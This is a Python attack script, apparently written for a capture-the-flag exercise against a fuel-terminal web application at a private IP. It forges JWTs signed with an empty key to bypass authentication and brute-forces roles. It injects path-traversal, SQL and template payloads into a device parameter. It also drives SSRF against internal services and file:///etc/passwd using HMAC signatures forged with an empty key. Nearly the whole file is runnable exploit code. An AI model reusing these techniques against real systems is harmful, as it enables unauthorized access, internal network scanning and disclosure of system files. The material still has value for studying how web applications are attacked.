#!/usr/bin/env python3
"""round28_deep_recon.py — Role enum, SSRF probe, diagnostics dump, custody access"""
import requests, time, json, hmac as hm, hashlib, base64, urllib.parse

CASPI = "http://192.168.242.102:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt(role="operator", sub="ctf", company="X", kid="/dev/null"):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid},separators=(',',':')).encode()
    p = json.dumps({"sub":sub,"company":company,"role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    key = b''
    return m+'.'+b64u(hm.new(key, m.encode(), hashlib.sha256).digest())

def auth(role="operator"):
    return {"Authorization": f"Bearer {jwt(role=role)}"}

def get(path, role="operator", **kw):
    try:
        r = S.get(f"{CASPI}{path}", headers=auth(role), timeout=15, **kw)
        return r.status_code, r.text, r.headers
    except Exception as e:
        return -1, str(e)[:200], {}

def post(path, role="operator", **kw):
    try:
        r = S.post(f"{CASPI}{path}", headers={**auth(role), **kw.pop("extra_headers",{})},
                   timeout=15, **kw)
        return r.status_code, r.text, r.headers
    except Exception as e:
        return -1, str(e)[:200], {}

# ============================================================
print("="*70)
print("PHASE 1: ROLE ENUMERATION FOR CUSTODY/INGEST")
print("="*70)

roles = [
    "operator", "admin", "custody", "custodian", "inspector",
    "auditor", "supervisor", "dispatcher", "engineer", "manager",
    "technician", "viewer", "readonly", "terminal", "terminal_ops",
    "custody_ops", "ops", "control", "shift_lead", "foreman",
    "analyst", "root", "superuser", "system", "service",
    "tank_farm", "loading", "metering", "quality", "hse",
    "logistics", "scheduler", "planner", "trader", "commercial"
]

xml_simple = '''<?xml version="1.0" encoding="UTF-8"?>
<ticket>
  <reference>R001</reference>
  <tankId>T-01</tankId><product>Diesel</product>
  <grossVolume>100</grossVolume><netVolume>99</netVolume>
  <density>0.85</density><temperature>20</temperature>
  <carrier>TestCarrier</carrier>
  <remarks>TestRemarks</remarks>
</ticket>'''

for role in roles:
    code, body, _ = post("/api/ops/custody/ingest", role=role,
        data=xml_simple, extra_headers={"Content-Type":"application/xml"})
    short = body[:80].replace("\n"," ")
    marker = ""
    if code == 200:
        marker = " <<< ACCESS!"
    elif code not in [403, -1]:
        marker = f" <<< UNUSUAL"
    print(f"  role={role:20s} [{code}] {short}{marker}")

# Also check which roles get access to different pages
print("\n--- Role access matrix ---")
endpoints = ["/ops", "/ops/custody", "/ops/diagnostics",
             "/api/ops/probe/sign?device=lm-01", "/api/auth/me"]
for role in ["operator", "admin", "custody", "inspector", "auditor",
             "supervisor", "engineer", "viewer", "analyst", "dispatcher"]:
    results = []
    for ep in endpoints:
        code, _, _ = get(ep, role=role)
        results.append(f"{code}")
    print(f"  {role:15s}: {' | '.join(f'{e:>6s}' for e in results)}")

# ============================================================
print("\n"+"="*70)
print("PHASE 2: DIAGNOSTICS PAGE CONTENT")
print("="*70)

code, body, _ = get("/ops/diagnostics", role="operator")
if code == 200:
    print(f"  Page length: {len(body)} bytes")
    print(body)

# ============================================================
print("\n"+"="*70)
print("PHASE 3: OPS PAGES WITH OPERATOR ROLE")
print("="*70)

for page in ["/ops", "/ops/custody"]:
    code, body, _ = get(page, role="operator")
    print(f"  GET {page} [{code}] ({len(body)} bytes)")
    if code == 200:
        import re
        scripts = re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL)
        for i, s in enumerate(scripts):
            if s.strip():
                print(f"    Script {i}: {s[:300]}")
        links_found = re.findall(r'href=["\']([^"\']+)', body)
        print(f"    Links: {links_found[:10]}")
        # Print full body if short
        if len(body) < 3000:
            print(f"    Full body:\n{body}")

# ============================================================
print("\n"+"="*70)
print("PHASE 4: PROBE SIGN PARAMETER INJECTION")
print("="*70)

# Try injecting into device parameter
injections = [
    "lm-01",
    "../../etc/passwd",
    "lm-01&url=http://127.0.0.1:5432",
    "lm-01%00extra",
    "AAAA",
    "' OR 1=1--",
    "../",
    "http://127.0.0.1",
    "${7*7}",
    "{{7*7}}",
    "",
    "lm-01/../../../secret",
    "lm-01/../../",
]

for dev in injections:
    code, body, _ = get(f"/api/ops/probe/sign?device={urllib.parse.quote(dev, safe='')}", role="operator")
    short = body[:120].replace("\n"," ")
    print(f"  device={dev:40s} [{code}] {short}")

# ============================================================
print("\n"+"="*70)
print("PHASE 5: PROBE SSRF - INTERNAL SCANNING")
print("="*70)

# Get valid signed URLs for all known devices
devices = ["lm-01", "tk-01", "tk-02", "tk-03", "tk-07"]
signed = {}
for dev in devices:
    code, body, _ = get(f"/api/ops/probe/sign?device={dev}", role="operator")
    if code == 200:
        try:
            d = json.loads(body)
            signed[dev] = (d["url"], d["sig"])
            print(f"  {dev}: url={d['url']} sig={d['sig'][:20]}...")
        except:
            pass

# Fetch data from all devices
print("\n--- Probe data from all devices ---")
for dev, (url, sig) in signed.items():
    code, body, _ = post("/api/ops/probe", role="operator",
        json={"url": url, "sig": sig})
    print(f"  {dev}: [{code}] {body[:150]}")

# Try manipulating signed URLs (maybe server only checks prefix?)
print("\n--- URL manipulation attempts ---")
if "lm-01" in signed:
    base_url, base_sig = signed["lm-01"]
    # Try adding query params
    manipulations = [
        (base_url + "?debug=1", base_sig),
        (base_url + "#fragment", base_sig),
        (base_url + "/../../secret", base_sig),
        (base_url.replace("loading-arm-1/flow", "secret"), base_sig),
        ("http://127.0.0.1:5432/", base_sig),
        ("http://gauge-gw.internal:9100/", base_sig),
        ("http://gauge-gw.internal:9100/v1/", base_sig),
        ("http://gauge-gw.internal:9100/secret", base_sig),
    ]
    for url, sig in manipulations:
        code, body, _ = post("/api/ops/probe", role="operator",
            json={"url": url, "sig": sig})
        short = body[:100].replace("\n"," ")
        print(f"  url={url:60s} [{code}] {short}")

# ============================================================
print("\n"+"="*70)
print("PHASE 6: PROBE WITH FORGED SIGNATURES")
print("="*70)

# Try signing our own URLs with empty key (same as JWT bypass)
targets = [
    "http://127.0.0.1:5432/",
    "http://gauge-gw.internal:9100/",
    "http://gauge-gw.internal:9100/v1/",
    "http://gauge-gw.internal:9100/secret",
    "http://gauge-gw.internal:9100/flag",
    "http://gauge-gw.internal:9100/v1/secret",
    "http://gauge-gw.internal:9100/v1/config",
    "http://localhost:3000/",
    "http://localhost:5000/",
    "http://localhost:8000/",
    "http://terminal-db:5432/",
    "http://127.0.0.1:9100/",
    "file:///etc/passwd",
    "file:///app/app.py",
]

for url in targets:
    # Try with HMAC-SHA256 using empty key
    sig = hm.new(b'', url.encode(), hashlib.sha256).hexdigest()
    code, body, _ = post("/api/ops/probe", role="operator",
        json={"url": url, "sig": sig})
    short = body[:80].replace("\n"," ")
    marker = " <<<" if code == 200 else ""
    print(f"  [{code}] {url:55s} {short}{marker}")

# ============================================================
print("\n"+"="*70)
print("PHASE 7: EXPLORE GAUGE-GW VIA VALID PROBE")
print("="*70)

# Use the probe's valid signatures to enumerate gauge-gw paths
# First check if the gauge-gw has an index/root
# We can only probe URLs that are validly signed, but let's check the base
# by signing new device names that map to useful paths

# Try device names that might map to interesting paths
interesting_devices = [
    "config", "secret", "flag", "admin", "status",
    "health", "env", "debug", "info", "version",
    "probe_secret", "hmac_key", "key", "keys",
    "internal", "private", "settings"
]

print("--- Signing interesting device names ---")
for dev in interesting_devices:
    code, body, _ = get(f"/api/ops/probe/sign?device={dev}", role="operator")
    if code == 200:
        try:
            d = json.loads(body)
            print(f"  device={dev:20s} url={d['url']} sig={d['sig'][:16]}...")
            # Now probe it
            pc, pb, _ = post("/api/ops/probe", role="operator",
                json={"url": d["url"], "sig": d["sig"]})
            short = pb[:100].replace("\n"," ")
            print(f"    probe result: [{pc}] {short}")
        except:
            print(f"  device={dev}: parse error: {body[:80]}")
    else:
        short = body[:60].replace("\n"," ")
        print(f"  device={dev:20s} [{code}] {short}")

# ============================================================
print("\n"+"="*70)
print("PHASE 8: /api/auth/me AND SESSION INFO")
print("="*70)

for role in ["operator", "admin"]:
    code, body, _ = get("/api/auth/me", role=role)
    print(f"  /api/auth/me (role={role}): [{code}] {body[:200]}")

# Check cookie-based auth
code, body, _ = get("/api/auth/me", role="operator")
print(f"\n  Session cookies: {dict(S.cookies)}")

# ============================================================
print("\n"+"="*70)
print("PHASE 9: STATIC ASSETS & JS")
print("="*70)

# Check for JS files that might reveal API endpoints
static_paths = [
    "/static/js/app.js", "/static/js/main.js", "/static/js/bundle.js",
    "/static/js/diagnostics.js", "/static/js/custody.js", "/static/js/probe.js",
    "/static/js/ops.js", "/static/js/login.js", "/static/js/auth.js",
    "/static/css/app.css", "/static/css/style.css",
    "/favicon.ico", "/robots.txt"
]

for p in static_paths:
    code, body, _ = get(p, role="operator")
    if code == 200:
        print(f"  {p}: [{code}] ({len(body)} bytes)")
        if body.strip() and len(body) < 5000:
            print(f"    Content: {body[:500]}")
        elif len(body) >= 5000:
            print(f"    First 500: {body[:500]}")

# ============================================================
print("\n"+"="*70)
print("PHASE 10: HOMEPAGE & NAVIGATION LINKS")
print("="*70)

code, body, _ = get("/", role="operator")
if code == 200:
    import re
    links = re.findall(r'href=["\']([^"\']+)', body)
    scripts = re.findall(r'src=["\']([^"\']+)', body)
    apis = re.findall(r'["\'](/api/[^"\']+)["\']', body)
    print(f"  Links: {links}")
    print(f"  Scripts: {scripts}")
    print(f"  API refs: {apis}")
    if len(body) < 5000:
        print(f"\n  Full page:\n{body}")

print("\n"+"="*70)
print("DONE")
print("="*70)
